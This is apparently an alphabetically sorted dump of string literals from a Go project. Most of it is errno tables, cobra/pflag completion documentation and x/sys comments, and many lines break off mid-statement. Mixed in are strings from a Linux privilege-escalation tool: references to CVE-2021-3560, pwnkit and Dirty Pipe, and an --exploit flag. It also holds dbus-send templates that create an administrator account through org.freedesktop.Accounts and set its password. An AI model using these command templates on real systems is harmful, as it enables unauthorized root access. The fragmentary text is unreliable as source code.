"{79, ""EOVERFLOW"", ""value too large for defined data type""},"
"{8, ""ENOEXEC"", ""exec format error""},"
"{8, ""SIGFPE"", ""arithmetic Exception""},"
"{8, ""SIGFPE"", ""floating point exception""},"
"{80, ""EAUTH"", ""authentication error""},"
"{80, ""EHOSTDOWN"", ""host is down""},"
"{80, ""ELIBBAD"", ""accessing a corrupted shared library""},"
"{80, ""ENONET"", ""machine is not on the network""},"
"{80, ""ENOTUNIQ"", ""name not unique on network""},"
"{81, ""EBADFD"", ""file descriptor in bad state""},"
"{81, ""EHOSTUNREACH"", ""no route to host""},"
"{81, ""ELIBSCN"", "".lib section in a.out corrupted""},"
"{81, ""ENEEDAUTH"", ""need authenticator""},"
"{81, ""ERREMOTE"", ""unknown error 81""},"
"{82, ""EIDRM"", ""identifier removed""},"
"{82, ""EIPSEC"", ""IPsec processing failure""},"
"{82, ""ELIBMAX"", ""attempting to link in too many shared libraries""},"
"{82, ""ENOLINK"", ""link has been severed""},"
"{82, ""EPWROFF"", ""device power is off""},"
"{82, ""EREMCHG"", ""remote address changed""},"
"{82, ""ERESTART"", ""restart the system call""},"
"{83, ""EADV"", ""advertise error""},"
"{83, ""EDEVERR"", ""device error""},"
"{83, ""ELIBACC"", ""can not access a needed shared library""},"
"{83, ""ELIBEXEC"", ""cannot exec a shared library directly""},"
"{83, ""ENOATTR"", ""attribute not found""},"
"{83, ""ENOMSG"", ""no message of desired type""},"
"{83, ""EPROCLIM"", ""too many processes""},"
"{84, ""EILSEQ"", ""illegal byte sequence""},"
"{84, ""EILSEQ"", ""invalid or incomplete multibyte or wide character""},"
"{84, ""ELIBBAD"", ""accessing a corrupted shared library""},"
"{84, ""EOVERFLOW"", ""value too large to be stored in data type""},"
"{84, ""ESRMNT"", ""srmount error""},"
"{84, ""EUSERS"", ""too many users""},"
"{85, ""EBADEXEC"", ""bad executable (or shared library)""},"
"{85, ""ECANCELED"", ""operation canceled""},"
"{85, ""ECOMM"", ""communication error on send""},"
"{85, ""EILSEQ"", ""illegal byte sequence""},"
"{85, ""ELIBSCN"", "".lib section in a.out corrupted""},"
"{85, ""ELOOP"", ""too many levels of symbolic links""},"
"{85, ""ENOMEDIUM"", ""no medium found""},"
"{85, ""ERESTART"", ""interrupted system call should be restarted""},"
"{86, ""EBADARCH"", ""bad CPU type in executable""},"
"{86, ""EILSEQ"", ""illegal byte sequence""},"
"{86, ""ELIBMAX"", ""attempting to link in more shared libraries than system limit""},"
"{86, ""ELIBMAX"", ""attempting to link in too many shared libraries""},"
"{86, ""EMEDIUMTYPE"", ""wrong medium type""},"
"{86, ""ENAMETOOLONG"", ""file name too long""},"
"{86, ""ENOTSUP"", ""not supported""},"
"{86, ""EPROTO"", ""protocol error""},"
"{86, ""ESTRPIPE"", ""streams pipe error""},"
"{87, ""ECANCELED"", ""operation Canceled""},"
"{87, ""ELIBEXEC"", ""can not exec a shared library directly""},"
"{87, ""ELIBEXEC"", ""cannot exec a shared library directly""},"
"{87, ""EMULTIHOP"", ""multihop attempted""},"
"{87, ""ENOATTR"", ""attribute not found""},"
"{87, ""EOVERFLOW"", ""value too large to be stored in data type""},"
"{87, ""ESHLIBVERS"", ""shared library version mismatch""},"
"{87, ""EUSERS"", ""too many users""},"
"{88, ""EBADMACHO"", ""malformed Mach-o file""},"
"{88, ""EBADMSG"", ""bad or Corrupt message""},"
"{88, ""ECANCELED"", ""operation canceled""},"
"{88, ""EDOOFUS"", ""programming error""},"
"{88, ""EDOTDOT"", ""RFS specific error""},"
"{88, ""EDQUOT"", ""disk quota exceeded""},"
"{88, ""EILSEQ"", ""illegal byte sequence""},"
"{88, ""EILSEQ"", ""invalid or incomplete multibyte or wide character""},"
"{88, ""ENOTSOCK"", ""socket operation on non-socket""},"
"{89, ""EBADMSG"", ""bad message""},"
"{89, ""ECANCELED"", ""operation canceled""},"
"{89, ""ECORRUPT"", ""invalid file system control data detected""},"
"{89, ""EDESTADDRREQ"", ""destination address required""},"
"{89, ""EIDRM"", ""identifier removed""},"
"{89, ""ENODATA"", ""no message available""},"
"{89, ""ENOSYS"", ""function not implemented""},"
"{89, ""ENOSYS"", ""operation not applicable""},"
"{89, ""EREMCHG"", ""remote address changed""},"
"{9, ""EBADF"", ""bad file descriptor""},"
"{9, ""EBADF"", ""bad file number""},"
"{9, ""SIGKILL"", ""killed""},"
"{90, ""EIDRM"", ""identifier removed""},"
"{90, ""ELOOP"", ""number of symbolic links encountered during path name traversal exceeds MAXSYMLINKS""},"
"{90, ""ELOOP"", ""too many levels of symbolic links""},"
"{90, ""EMSGSIZE"", ""message too long""},"
"{90, ""EMULTIHOP"", ""multihop attempted""},"
"{90, ""ENOMSG"", ""no message of desired type""},"
"{90, ""ENOSR"", ""no STREAM resources""},"
"{90, ""ENOSYS"", ""function not implemented""},"
"{90, ""ESYSERROR"", ""for future use ""},"
"{91, ""ELAST"", ""not supported""},"
"{91, ""ENOLINK"", ""link has been severed""},"
"{91, ""ENOMSG"", ""no message of desired type""},"
"{91, ""ENOSTR"", ""not a STREAM""},"
"{91, ""ENOTSUP"", ""not supported""},"
"{91, ""EPROTOTYPE"", ""protocol wrong type for socket""},"
"{91, ""ERESTART"", ""error 91""},"
"{91, ""ERESTART"", ""interrupted system call should be restarted""},"
"{91, ""ESTRPIPE"", ""streams pipe error""},"
"{92, ""EBADMSG"", ""bad message""},"
"{92, ""EILSEQ"", ""illegal byte sequence""},"
"{92, ""ENOPROTOOPT"", ""protocol not available""},"
"{92, ""EOVERFLOW"", ""value too large for defined data type""},"
"{92, ""EPROTO"", ""protocol error""},"
"{92, ""ESTRPIPE"", ""error 92""},"
"{92, ""ESTRPIPE"", ""streams pipe error""},"
"{92, ""ETIME"", ""STREAM ioctl timeout""},"
"{93, ""EBADFD"", ""file descriptor in bad state""},"
"{93, ""ENOATTR"", ""attribute not found""},"
"{93, ""ENOMEDIUM"", ""no medium found""},"
"{93, ""ENOTCAPABLE"", ""capabilities insufficient""},"
"{93, ""ENOTEMPTY"", ""directory not empty""},"
"{93, ""ENOTRECOVERABLE"", ""state not recoverable""},"
"{93, ""EPROTONOSUPPORT"", ""protocol not supported""},"
"{93, ""EREMOTE"", ""item is not local to host""},"
"{94, ""EBADMSG"", ""bad message""},"
"{94, ""ECAPMODE"", ""not permitted in capability mode""},"
"{94, ""ECHRNG"", ""channel number out of range""},"
"{94, ""EMULTIHOP"", ""multihop attempted""},"
"{94, ""ENOTRECOVERABLE"", ""state not recoverable ""},"
"{94, ""EOWNERDEAD"", ""previous owner died""},"
"{94, ""ESOCKTNOSUPPORT"", ""socket type not supported""},"
"{94, ""EUSERS"", ""too many users""},"
"{95, ""EL2NSYNC"", ""level 2 not synchronized""},"
"{95, ""ELAST"", ""protocol error""},"
"{95, ""EMULTIHOP"", ""EMULTIHOP (Reserved)""},"
"{95, ""ENOLINK"", ""link has been severed""},"
"{95, ""ENOTRECOVERABLE"", ""state not recoverable""},"
"{95, ""ENOTSOCK"", ""socket operation on non-socket""},"
"{95, ""ENOTSUP"", ""operation not supported""},"
"{95, ""EOWNERDEAD"", ""previous owner died ""},"
"{96, ""EDESTADDRREQ"", ""destination address required""},"
"{96, ""EL3HLT"", ""level 3 halted""},"
"{96, ""ELAST"", ""protocol error""},"
"{96, ""ENODATA"", ""no message available on STREAM""},"
"{96, ""EOWNERDEAD"", ""previous owner died""},"
"{96, ""EPFNOSUPPORT"", ""protocol family not supported""},"
"{97, ""EAFNOSUPPORT"", ""address family not supported by protocol""},"
"{97, ""EL3RST"", ""level 3 reset""},"
"{97, ""EMSGSIZE"", ""message too long""},"
"{97, ""ENOLINK"", ""ENOLINK (Reserved)""},"
"{98, ""EADDRINUSE"", ""address already in use""},"
"{98, ""ELNRNG"", ""link number out of range""},"
"{98, ""ENOSR"", ""no STREAM resources""},"
"{98, ""EPROTOTYPE"", ""protocol wrong type for socket""},"
"{99, ""EADDRNOTAVAIL"", ""cannot assign requested address""},"
"{99, ""EASYNC"", ""unknown error: 99""},"
"{99, ""ENOPROTOOPT"", ""option not supported by protocol""},"
"{99, ""ENOPROTOOPT"", ""protocol not available""},"
"{99, ""ENOSTR"", ""not a STREAM""},"
"{99, ""EUNATCH"", ""protocol driver not attached""},"
"{Sec: buf.Actime},"
"{Sec: buf.Modtime},"
"{{with .Name}}{{printf ""%s "" .}}{{end}}{{printf ""version %s"" .Version}}"
"} else if _, isBg := bgTags[name]"
"} else if attr, isAttr := attrTags[name]"
"} else if exploitName != """" {"
"} else if flag.NoOptDefVal != """" {"
"}, nil"
"}{addr, length, length}"
$ HELM_ACTIVE_HELP=0 bin/helm __complete install wordpress bitnami/h<ENTER>
$ HELM_ACTIVE_HELP=1 bin/helm __complete install wordpress bitnami/h<ENTER>
$ aliasname <tab><tab>
$ go get github.com/hashicorp/go-version
$ helm __complete status har<ENTER>
$ helm s[tab]
$ helm s[tab][tab]
$ helm status --output [tab][tab]
$ helm status [tab][tab]
$ hugo srever
$ kubectl exec [tab][tab]
$ kubectl get [tab][tab]
$ kubectl get rc [tab][tab]
$ kubectl remove
$(0x156
$(info 
$/ { print $2 }' 
$/ {next}
$0x08
$0x09
$0x0A            // SVC 08 LOAD
$0x0A            // SVC 09
$0x0A            // SVC 09 DELETE
$0x0D                // Branch to function
$0x80
$0xEF
$2 !
$CC $ccflags -o _errors _errors.c 
$GODEFS types.go 
$GODEFS types_$GOOS.go 
$GOPATH/src/golang.org/x/term
$Profile
$cmd docker build --tag generate:$GOOS $GOOS
$fpath
$prefix.
$tab
$tab}
${COMPREPLY[@]/
${GOOS}
${GOOS}/Dockerfile
${GOOS}/mkall.go
${GOOS}/mksysnum.go
${GOOS}/types.go
${char}
%[1]s completion bash > $(brew --prefix)/etc/bash_completion.d/%[1]s
%[1]s completion bash > /etc/bash_completion.d/%[1]s
%[1]s completion fish 
%[1]s completion fish > 
%[1]s completion powershell 
%[1]s completion zsh > $(brew --prefix)/share/zsh/site-functions/_%[1]s
'P' to the name of any function that defines a flag.
'create' without any additional configuration
(%s)
((0x)
((FOLDERID_[
(([A-Z]
((y)-1))/(y))
(-([0-9]
(-([A-Za-z
(0x[
(1<<(uintptr(fd)%NFDBITS)) != 0
(AT_SYMLINK_NOFOLLOW
(BPF
(BPF_TIMEVAL
(BPF_TIMEVAL)$/ 
(CLOCK
(CMN
(ENCRYPTION
(FLU
(GET$
(HDIO
(IFF
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
(MAP_FAILED)$/ {next}
(NETLINK
(NTSTATUS
(OLD
(O_CREAT
(SCM_SRCRT)$/ {next}
(SIGEV_
(TASKSTATS
([0-9A-Za-z
([0-9]
([0-9][0-9]
([A-Z0-9_]
([A-Z0-9_][A-Z0-9_]
([A-Z][A-Z0-9_]
([A-Za-z
(int
(len(arg) >= 2 
(right 
(salign - 1)
(see [Bash Completions](bash_completions.md)) but instead works only with the Go dynamic completion
(writing the shell script to stdout allows the most flexible use):
(y))
) = RawSockaddrInet4{
) >_const.go
) >_errors.c
) ]]
) ]] 
) it will be accessiblei
) it will only be accessible via 
) to be called when the built in processor was unable to find a solution. In the case of kubernetes a valid command might look something like 
)$/ 
)${SP}${SP}
)((0x)
)/= Errno(
)/= Signal(
)/= syscall.Errno(
)/= syscall.Signal(
)/SYS_
)](https://github.com/UpCloudLtd/upcloud-cli)
)a - 
)a)->num - ((struct tuple 
)b)->num
- 09/03/21: [Hacker News thread](https://news.ycombinator.com/item
- 20/06/21: [Console 58](https://console.substack.com/p/console-58) - Awesome newsletter featuring tools and beta releases for developers.
- 28/04/21: [Intigriti Bug Bytes 
- Bash
- Bash (using [bash completion V2](shell_completions.md
- CVE-2021-3560
- CVE-2021-4034 (pwnkit)
- CVE-2022-0847 (Dirty pipe)
- Nearly all of [GTFOBins](https://gtfobins.github.io/)
- PowerShell
- Small completion script of less than 300 lines (v1 generates scripts of thousands of lines
- Streamlined user experience thanks to a completion behavior aligned with the other shells 
- Supports completion descriptions (like the other shells)
- Updating the version of critical libraries such as 
- VMware's [Tanzu Community Edition](https://github.com/vmware-tanzu/community-edition) 
- Writeable docker.sock
- Zsh
- [Arduino CLI](https://github.com/arduino/arduino-cli)
- [Bleve](https://blevesearch.com/)
- [CockroachDB](https://www.cockroachlabs.com/)
- [Cosmos SDK](https://github.com/cosmos/cosmos-sdk)
- [Datree](https://github.com/datreeio/datree)
- [Delve](https://github.com/derekparker/delve)
- [Docker (distribution)](https://github.com/docker/distribution)
- [Etcd](https://etcd.io/)
- [Gardener](https://github.com/gardener/gardenctl)
- [Giant Swarm's gsctl](https://github.com/giantswarm/gsctl)
- [Git Bump](https://github.com/erdaltsksn/git-bump)
- [GitHub Labeler](https://github.com/erdaltsksn/gh-label)
- [Github CLI](https://github.com/cli/cli)
- [GoReleaser](https://goreleaser.com)
- [Golangci-lint](https://golangci-lint.run)
- [GopherJS](https://github.com/gopherjs/gopherjs)
- [Helm](https://helm.sh)
- [Hugo](https://gohugo.io)
- [Infracost](https://github.com/infracost/infracost)
- [Istio](https://istio.io)
- [Kool](https://github.com/kool-dev/kool)
- [Kubernetes](https://kubernetes.io/)
- [Kubescape](https://github.com/armosec/kubescape)
- [Linkerd](https://linkerd.io/)
- [Mattermost-server](https://github.com/mattermost/mattermost-server)
- [Mercure](https://mercure.rocks/)
- [Meroxa CLI](https://github.com/meroxa/cli)
- [Metal Stack CLI](https://github.com/metal-stack/metalctl)
- [Moby (former Docker)](https://github.com/moby/moby)
- [Moldy](https://github.com/Moldy-Community/moldy)
- [Multi-gitter](https://github.com/lindell/multi-gitter)
- [Nanobox](https://github.com/nanobox-io/nanobox)/[Nanopack](https://github.com/nanopack)
- [OpenShift](https://www.openshift.com/)
- [Ory Hydra](https://github.com/ory/hydra)
- [Ory Kratos](https://github.com/ory/kratos)
- [Pixie](https://github.com/pixie-io/pixie)
- [Polygon Edge](https://github.com/0xPolygon/polygon-edge)
- [Pouch](https://github.com/alibaba/pouch)
- [ProjectAtomic (enterprise)](https://www.projectatomic.io/)
- [Prototool](https://github.com/uber/prototool)
- [Pulumi](https://www.pulumi.com)
- [QRcp](https://github.com/claudiodangelis/qrcp)
- [Random](https://github.com/erdaltsksn/random)
- [Rclone](https://rclone.org/)
- [Scaleway CLI](https://github.com/scaleway/scaleway-cli)
- [Skaffold](https://skaffold.dev/)
- [Tendermint](https://github.com/tendermint/tendermint)
- [Twitch CLI](https://github.com/twitchdev/twitch-cli)
- [UpCloud CLI (
- [Werf](https://werf.io/)
- [nFPM](https://nfpm.goreleaser.com)
- anthonyfok
- bep
- bodyclose
- bogem
- broady
- depguard
- dogsled
- dupl
- eparis
- exhaustive
- fish
- funlen
- gochecknoinits
- gocritic
- gocyclo
- gofmt
- gomnd
- goprintffuncname
- gosec
- gosimple
- jharshman
- johnSchnake
- jpmcb
- lll
- make build-travis
- marckhouzam
- master
- misspell
- nakedret
- noctx
- nolintlint
- rowserrcheck
- scopelint
- shell-script -
- spf13
- staticcheck
- stylecheck
- typecheck
- unparam
- unused
- wfernandes
- whitespace
--any
--author
--exploit
--flag    // boolean flags only
--flag x  // only on flags without a default value
--flag=x
--help
--json
--namespace
--no-descriptions
--output=)json
--password
--session --print-reply --type=method_call --dest=org.freedesktop.PackageKit /org/freedesktop/PackageKit org.freedesktop.PackageKit.Modify.InstallPackageNames uint32:1 array:string:%s string:
--system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:%s string:%s int32:1
--system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User%s org.freedesktop.Accounts.User.SetPassword string:%s string:lol
--username
--verbose
--version
--yaml
-Ifile
-abc
-abcn1234
-abcs1234
-asd
-b true is INVALID
-c            --container=  -p            --pod=
-f=true
-n 1234
-n1234
-n=1234
-syscalls)
.  For example:
.  So it will call 
.  The 
.  The V2 version does 
.  The variable should be set by the user to whatever
.  Then a user
.  These directives are bit fields allowing to control some shell completion behaviors for your particular completion.  You can combine them with the bit-or operator such as 
.  You can use the 
.  You will need to start a new shell for the completions to become available.
. All of
. Cobra will provide the description automatically based on usage information. You can choose to make this option configurable by your users.
. Descriptions are only displayed when using the 
. If you type 
. The first line is not indented (this is assumed to be done by
. This may
. This will generate the files for
. You can
. You can choose to make
. You can use the 
... did you mean 
...] (RESOURCE [NAME] 
.PHONY: build
.PHONY: build test 
.PHONY: fmt lint test install_deps clean
.PHONY: install
.PHONY: pack
.PHONY: test
.[0-9A-Za-z
.[0-9]
.[568vq]
.cgo1.go
.cgo2.c
.exe
.go files it is compiled as Go code but also
.go.
.idea
.idea/
.iml
.json or 
.netrwhist
.s[a-w][a-z]
.vscode
.yaml:
/${flag}=}
/.config/fish/completions/%[1]s.fish
/.zshrc
//   
//          const char 
//          const void 
//          int flags
//          int options
//          void 
//       argument to the right of the separator. You cannot use both arguments in a single use of the command.
//      )
//      int setxattr(
//     // NULL value
//     // use u.UUID
//     but only if there is space or tab inside s.
//     https://docs.microsoft.com/en-us/windows-hardware/drivers/install/setupapi
//     https://docs.microsoft.com/en-us/windows/win32/devinst/cfgmgr32-
//    uuid.Must(uuid.NewRandom())
//    uuid.New().String()
//   (cat /proc/version 
//   - Uint16/SetUint16: flags
//   - every back slash (
//   ... indicates that you can specify multiple values for the previous argument.
//   [ ] identifies an optional argument. Arguments that are not enclosed in brackets are required.
//   lsb_release -a 2>/dev/null
//   { } delimits a set of mutually exclusive arguments when one of the arguments is required. If the arguments are
//  - 
//  - VMADDR_CID_HOST: refers to other processes on the host.
//  - VMADDR_CID_HYPERVISOR: refers to the hypervisor process.
//  - VMADDR_CID_LOCAL: refers to local communication (loopback).
//  ...
//  Randomly generated UUIDs have 122 random bits.  One's annual risk of being
//  darwin:
//  equivalent to the odds of creating a few tens of trillions of UUIDs in a
//  if u.Valid {
//  linux:
//  means the probability is about 0.00000000006 (6 
//  var u uuid.NullUUID
//  year and having one duplicate.
//  }
//  } else {
// $COMMAND
// '--flag arg'
// '--flag' (arg was optional)
// '--flag' (arg was required)
// '--flag=arg'
// '-f arg'
// '-f' (arg was optional)
// '-f' (arg was required)
// '-f=arg arg ...'
// '-f=arg'
// '-farg'
// (16-bit uid calls are not always supported in newer kernels)
// (386 default is 32-bit file system and 16-bit uid).
// (Codes marked as read-only (R) may only be used for
// (The default value is represented as a string.)
// (This is the standard convention.)
// (Version 4) UUID generation. The pool contains random bytes read from
// (according to the semantics of the specific function being called) before consulting
// (and is what glibc does).
// (section 4.1.6)
// (this includes all non deprecated/hidden commands).
// - https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
// - https://seclists.org/oss-sec/2022/q1/80
// - root commands with no subcommands can take arbitrary arguments
// - root commands with subcommands will do subcommand validity checking
// - subcommands will always accept arbitrary arguments
// - there are no arguments on the command-line and
// -- bool Value
// -- boolSlice Value
// -- count Value
// -- durationSlice Value
// -- float32 Value
// -- float32Slice Value
// -- float64 Value
// -- float64Slice Value
// -- int Value
// -- int16 Value
// -- int32 Value
// -- int32Slice Value
// -- int64 Value
// -- int64Slice Value
// -- int8 Value
// -- intSlice Value
// -- ipSlice Value
// -- net.IP value
// -- net.IPMask value
// -- string Value
// -- stringArray Value
// -- stringSlice Value
// -- stringToInt Value
// -- stringToInt64 Value
// -- stringToString Value
// -- time.Duration Value
// -- uint Value
// -- uint16 value
// -- uint32 value
// -- uint64 Value
// -- uint8 Value
// -- uintSlice Value
// --unknown=unknownval arg ...
// -1 causes a new sequence to be generated.
// 1 unit up can be expressed as 
// 1- There could be some valid completions even though there was an error
// 1. The user calls port_dissociate before any events fire
// 1582.
// 2. An event fires and we return it to the user
// 2ae01472317d1935a84797ec1983ae243fc6aa28
// 3- c already has a 'completion' command provided by the program.
// 32-bit aligned access to network subsystem.
// 32-bit aligned and some architectures don't allow unaligned
// 4122.
// 5 units up can be expressed as 
// 64 bits should be enough. (32 bits isn't even on 386). Since the
// 64-bit Dragonfly before the September 2019 ABI changes still requires
// 64-bit file system and 32-bit uid calls
// 7 minutes and 10 seconds.
// <PROGRAM>_ACTIVE_HELP where <PROGRAM> is the name of the root command in upper
// ===========================================================================
// A DLL implements access to a single DLL.
// A Dir contains the metadata for a file.
// A Domain represents a Version 2 domain
// A Flag represents the state of a flag.
// A FlagSet represents a set of defined flags.
// A LazyDLL implements access to a single DLL.
// A LazyProc implements access to a procedure inside a LazyDLL.
// A Note is a string describing a process note.
// A Proc implements access to a procedure inside a DLL.
// A Qid represents a 9P server's unique identification for a file.
// A Time represents a time as the number of 100's of nanoseconds since 15 Oct
// A UUID is a 128 bit (16 byte) Universal Unique IDentifier as defined in RFC
// A UUID is a 16 byte (128 bit) array.  UUIDs may be used as keys to
// A Variant represents a UUID's variant.
// A Version represents a UUID's version.
// A completion command is already available
// A constraint with a pre-release can only match a pre-release version
// A constraint without a pre-release can only match a version without a
// A count flag will add 1 to its value every time it is found on the command line
// A count flag will add 1 to its value evey time it is found on the command line
// A description is following a tab character.
// A few ioctl requests use the return value as an output parameter
// A full list of tags is available here: https://github.com/liamg/tml
// A long flag with a space separated value
// A note about uniqueness derived from the UUID Wikipedia entry:
// A pointer to a SID structure representing a group that will become
// A short flag with a space separated value
// A type separate from ifreq is required in order to comply with the
// A value which may be passed to the which parameter for Getitimer and
// ACLFromEntries returns a new ACL on the Go heap containing a list of explicit entries as well as those of another ACL.
// AIX doesn't have any flags for umount.
// Accept_nocancel
// Accepted socket has no address.
// Access rights for process.
// Access rights for thread.
// Access_extended
// Account for the additional NULL byte added by
// ActiveHelp line will be shown below the previous ones when completion is triggered.
// AddCommand adds one or more commands to this parent command.
// AddFlag will add the flag to the FlagSet
// AddFlagSet adds one FlagSet to another. If a flag is already present in f
// AddGoFlag will add the given 
// AddGoFlagSet will add the given 
// AddTemplateFunc adds a template function that's available to Usage and Help
// AddTemplateFuncs adds multiple template functions that are available to Usage and
// Add_profil
// Addr is the type of address used to manipulate a socket. Addr must be
// Addr returns the address of the procedure represented by p.
// Adds a special hidden command that can be used to request custom completions.
// AfsSyscall
// Aio_cancel
// Aio_error
// Aio_fsync
// Aio_read
// Aio_return
// Aio_suspend
// Aio_suspend_nocancel
// Aio_write
// Aix system calls.
// Aliases is an array of aliases that can be used instead of the first word in Use.
// All directives using iota should be above this one.
// AllGroups returns a slice that can be used to iterate over the groups in g.
// AllPrivileges returns a slice that can be used to iterate over the privileges in p.
// Also say we need help if the command isn't runnable.
// Always set IP family as ioctls would require it anyway.
// An Ifreq is a type-safe wrapper around the raw ifreq struct. An Ifreq
// An access token contains the security information for a logon session.
// An empty byte array is not sufficient. To maintain the same behaviour as the
// An empty string would cause a array with one (empty) string
// An empty string would cause a slice with one (empty) string
// An empty string would cause an empty map
// Analogous to epoll_event on Linux.
// Annotations are key/value pairs that can be used by applications to identify or
// Annotations for Bash completion.
// Append adds the specified value to the end of the flag value list.
// AppendActiveHelp adds the specified string to the specified array to be used as ActiveHelp.
// ArbitraryArgs never returns an error.
// ArchPrctl
// Arg returns the i'th argument.  Arg(0) is the first remaining argument
// Arg returns the i'th command-line argument.  Arg(0) is the first remaining argument
// ArgAliases is List of aliases for ValidArgs.
// Args returns the non-flag arguments.
// Args returns the non-flag command-line arguments.
// ArgsLenAtDash will return the length of c.Flags().Args at the moment
// ArgsLenAtDash will return the length of f.Args at the moment when a -- was
// AssociateFd wraps calls to port_associate(3c) on file descriptors.
// AssociatePath wraps port_associate(3c) for a filesystem path including
// Assume caller wants to disable accounting.
// Assume hashfd and addr are already configured using the setup process.
// Assume hashfd is already configured using the setup process.
// Assume path ends at NUL.
// At the moment rusage will not be touched.
// Atsocket
// Audit
// Auditctl
// Auditon
// Authorization Functions
// BSD system call wrappers shared by 
// BUG(brainman): The definition of Linger is not appropriate for direct use
// BashCompletionFunction is custom bash functions used by the legacy bash autocompletion generator.
// Because a constraint could have more/less specificity than the version it's
// Because people naturally expect syscall.Faccessat to act
// BindToDevice binds the socket associated with fd to device.
// Bluetooth Protocols
// Bluetooth sockets and messages
// Both EnableRandPool and DisableRandPool are not thread-safe and should
// Both explicitEntries and mergedACL are optional and can be nil.
// Both pointers must be nil.
// Brk
// Bsdthread_create
// Bsdthread_register
// Bsdthread_terminate
// BuildDriverInfoList method builds a list of drivers that is associated with a specific device or with the global class driver list for a device information set.
// But we need to save the cookie
// By default it prints a simple header and calls PrintDefaults
// BytePtrFromString in kexecFileLoad. The kexec_file_load
// BytePtrFromString returns a pointer to a NUL-terminated array of
// BytePtrToString takes a pointer to a sequence of text and returns the corresponding string.
// ByteSliceFromString returns a NUL-terminated slice of bytes
// BytesBase64 adapts []byte for use as a flag. Value of flag is Base64 encoded
// BytesHex adapts []byte for use as a flag. Value of flag is HEX encoded
// CID and Port specify a context ID and port address for a VM socket.
// CONFIGRET is a return value or error code from cfgmgr32 APIs
// CPU affinity functions
// CPUSet represents a CPU affinity mask.
// Call __errno function.
// Call function.
// Call syscall from C code because the gccgo support for calling from
// Call the registered completion function to get the completions.
// CalledAs returns the command name or alias that was used to invoke
// Callers must inspect the primary return value to decide whether an error occurred
// Callers should use ioctlPtr when the third argument is a pointer and ioctl
// Calling SetRand with nil sets the random number generator to the default
// Calling use(p) ensures that p is kept live until that point.
// Can be defined by user by overriding HelpFunc.
// Can be defined by user by overriding UsageFunc.
// CancelDriverInfoSearch method cancels a driver list search that is currently in progress in a different thread.
// Cannot safely interpret raw.Addr bytes as an IPv4 address.
// CapRightsClear clears the permissions in clearrights from rights.
// CapRightsGet returns a CapRights structure containing the operations permitted on fd.
// CapRightsInit returns a pointer to an initialised CapRights structure filled with rights.
// CapRightsIsSet checks whether all the permissions in setrights are present in rights.
// CapRightsLimit reduces the operations permitted on fd to at most those contained in rights.
// CapRightsSet sets the permissions in setrights in rights.
// Certain constants are missing from the fs/crypto UAPI
// Certain file systems get rather angry and EINVAL if you give
// Changed returns true if the flag was explicitly set during Parse() and false
// Charspare
// Check for error and sanity check group count. Newer versions of
// Check for useless names before allocating a string.
// Check if interspersed is false or -- was set on a previous arg.
// Check if the data was written
// Check if we are completing a flag value subject to annotations
// Check if we are doing flag value completion before parsing the flags.
// Check tests if a constraint is validated by the given version.
// Check tests if a version satisfies all the constraints.
// Check that EZBNMIF4 returned a nwmConnEntry
// Check that EZBNMIF4 returned a nwmRecHeader
// Check the last part of the segment in the constraint. If the version segment at
// Check the segments in the constraint against those in the version. If the version
// Check to see if the remaining segments in Other are all zeros
// Check to see if the remaining segments in Self are all zeros -
// Chmod_extended
// ClassInstallHeader is the first member of any class install parameters structure. It contains the device installation request code that defines the format of the rest of the install parameters structure.
// ClassInstallParams method retrieves class installation parameters for a device information set or a particular device information element.
// Clear removes cpu from the set s.
// Clear removes fd from the set fds.
// Client example:
// ClockNanosleep
// ClockSequence returns the clock sequence encoded in uuid.
// ClockSettime
// Clone
// Close closes the event port.
// Close method deletes a device information set and frees all associated memory.
// Close releases access to access token.
// Close_nocancel
// CmsgLen returns the value to store in the Len field of the Cmsghdr
// CmsgSpace returns the number of bytes an ancillary element with
// Code generated by 'go generate'
// Code generated by 'mkerrors.bash'
// Code generated by 'mkknownfolderids.bash'
// Code generated by cmd/cgo -godefs
// Code generated by mkmerge
// Code generated by the command above
// Collection is a type that implements the sort.Interface interface
// Command.ExecuteContext or Command.ExecuteContextC
// CommandPath returns the full path to this command.
// CommandPathPadding return padding for the command path.
// Commands returns a sorted slice of child commands.
// CompDebug prints the specified string to the same file as where the
// CompDebugln prints the specified string with a newline at the end
// CompError prints the specified completion message to stderr.
// CompErrorln prints the specified completion message to stderr with a newline at the end.
// Compare Source against PORT_SOURCE_FILE or PORT_SOURCE_FD
// Compare compares this version to another version. This
// Compare the segments
// Complete required flags even without the '-' prefix
// CompletionOptions are the options to control shell completion
// CompletionOptions is a set of options to control the handling of shell completion
// Concrete example: https://github.com/spf13/cobra/issues/393
// Connect_nocancel
// Console related constants used for the mode parameter to SetConsoleMode. See
// Constants
// Constants for AceFlags and Inheritance fields
// Constants for LocalAlloc flags.
// Constants for MULTIPLE_TRUSTEE_OPERATION
// Constants for ObjectsPresent field
// Constants for TRUSTEE_FORM
// Constants for TRUSTEE_TYPE
// Constants for security attributes when opening named pipes.
// Constants for the ContextTrackingMode field of SECURITY_QUALITY_OF_SERVICE.
// Constants for the CreateNamedPipe-family of functions.
// Constants for the completion command
// Constants for type ACCESS_MASK
// Constants for type ACCESS_MODE
// Constants for type SECURITY_DESCRIPTOR_CONTROL
// Constants for type SECURITY_INFORMATION
// Constants for type SE_OBJECT_TYPE
// Constants returned by Variant.
// Constants that were deprecated or moved to enums in the FreeBSD headers. Keep
// Constraint functions
// Constraints example.
// Constraints is a slice of constraints. We make a custom type so that
// Context returns underlying command context. If command was executed
// ContinueOnError error handling policy.
// ContinueOnError will return an err from Parse() if an error is found
// Control returns the security descriptor control bits.
// Copied from linux/hid.h.
// Copied from linux/l2tp.h
// Copy creates a duplicate of security identifier SID.
// Copy data from the returned data structures into tcpInfo
// Copy entry into return buffer.
// Copy stdin to the pty and the pty to stdout.
// Copyfile
// Copyright 
// Copyright 2009 The Go Authors. All rights reserved.
// Copyright 2010 The Go Authors. All rights reserved.
// Copyright 2011 The Go Authors. All rights reserved.
// Copyright 2012 The Go Authors. All rights reserved.
// Copyright 2013 The Go Authors. All rights reserved.
// Copyright 2014 The Go Authors. All rights reserved.
// Copyright 2015 The Go Authors. All rights reserved.
// Copyright 2016 Google Inc.  All rights reserved.
// Copyright 2016 The Go Authors. All rights reserved.
// Copyright 2017 Google Inc.  All rights reserved.
// Copyright 2017 The Go Authors. All rights reserved.
